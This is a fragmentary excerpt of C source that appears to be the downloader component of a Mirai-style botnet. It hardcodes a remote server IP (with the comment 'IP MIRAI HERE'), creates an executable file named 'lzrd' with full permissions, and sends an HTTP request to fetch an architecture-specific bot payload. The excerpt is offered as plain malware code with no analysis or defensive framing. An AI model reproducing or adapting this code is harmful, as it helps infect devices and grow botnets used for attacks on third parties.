...
#define HTTP_SERVER utils_inet_addr(35,240,214,197) //IP MIRAI HERE

#define EXEC_MSG            "LIZRD\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "lzrd\n"
...
inline void run(void)
{
    ...
    ffd = open("lzrd", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /d/xd." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
